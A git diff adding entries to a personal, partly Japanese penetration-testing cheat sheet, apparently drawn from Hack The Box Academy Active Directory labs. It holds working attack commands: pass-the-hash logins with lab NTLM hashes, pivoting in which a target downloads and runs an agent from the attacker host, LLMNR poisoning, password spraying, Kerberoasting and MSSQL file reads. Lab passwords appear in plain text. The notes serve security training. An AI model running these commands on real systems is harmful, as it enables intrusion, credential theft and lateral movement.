@@ -1,5 +1,8 @@
 # Cheet Sheet
 
+### LDAPの識別名
+CN=グループ名,CN=コンテナ名,DC=ドメイン名,DC=トップレベルドメイン
+
 ## Site
 
 ### Reverse Shell Generator
@@ -7,6 +10,12 @@ https://www.revshells.com/
 
 ### Crack password on website
 https://crackstation.net/
+
+### Sans SMBClient Cheat Sheet
+https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
+
+### Windows PowerView Cheet Sheet
+https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 
 ## Crawling
 ### python
@@ -104,6 +113,10 @@ hydra -L user.list -P password.list ssh://10.129.42.197
 
 ### RDP
 netexec winrm <ip> -u user.list -p password.list
+
+### RDP(with admin) DisableRestrictedAdmin レジストリキーの追加
+C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
 
 ### Default Credentials
 https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv
@@ -209,3 +222,112 @@ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129
 impacket-secretsdump -k -no-pass -dc-ip 10.129.180.85 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ### 抜き出したAdministratorのNTLMハッシュを使って、リモート接続
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c Administrator@10.129.53.88
+
+### RDPで接続したWindowsとファイルをやりとりする方法
+proxychains xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /drive:tools,/home/htb-ac-1937176/tools
+
+### lindigo
+-attacker host
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+python3 -m http.server
+-target host
+wget http://PWNIP:8000/agent
+-attacker host
+sudo ./proxy -selfcert
+-target host
+chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
+-attacker host
+session
+autoroute
+
+### SMB Enumuration
+./enum4linux-ng.py 10.10.11.45 -A -C
+
+### サブドメインの列挙
+git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+cd subbrute
+echo "ns1.inlanefreight.com" > ./resolvers.txt
+./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
+
+### DIG - MX Records
+dig mx plaintext.do | grep "MX" | grep -v ";"
+
+### Password attack to smtp, pop3
+hydra -l 'marlin@inlnanefreight.htb' -P ./pws.list -f 10.129.203.12 smtp
+
+### MSSSQL
+###　ローカルファイルを読み取る
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Content
+### リンクサーバーを確認する
+SELECT srvname, isremote FROM sysservers
+### Imperonate可能なユーザーを見つける
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE
+
+### windows port proxy
+### find internal ip
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply" 
+### port proxy
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+
+
+### Chisel
+### Server side
+./chisel server -v -p 1234 --socks5
+### Client side
+./chisel client -v 10.129.202.64:1234 socks
+
+### ネットワーク内でアクティブなホストを検証
+fping -asgq 172.16.5.0/23
+
+### LinuxからのLLMNR/NBT-NS ポイズニング
+sudo responder -I ens224 
+### WindowsからのLLMNR/NBT-NS ポイズニング
+PS C:\htb> Import-Module .\Inveigh.ps1 #ps版はすでに保守されておらず、C#版が保守されているとのこと。自分でbuildする必要がある。
+PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y　
+
+### Enumerate valid usernames using Kerbrute
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+### Linux Domain Passwordspray
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+
+### Windows Domain Passwordspray
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+### RIDによるRPCClientユーザー列挙
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> enumdomusers
+
+### admin権限を持っているが無効化されているuser account
+dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -limit 5 -attr SAMAccountName description
+
+### GetUserSPNs.py で SPN アカウントを一覧表示する
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs # ユーザーを指定して出力ファイルも指定
+
+### Windows:Enumerating SPNs with setspn.exe
+setspn.exe -Q */*
+
+### Check the user have rights to other's user.
+PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+
+### Check user in the group
+PS C:\htb> $sid = Convert-NameToSid "forend"
+PS C:\htb> Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
+
+### Check reverse password accounts
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
+### WinRM from windows
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
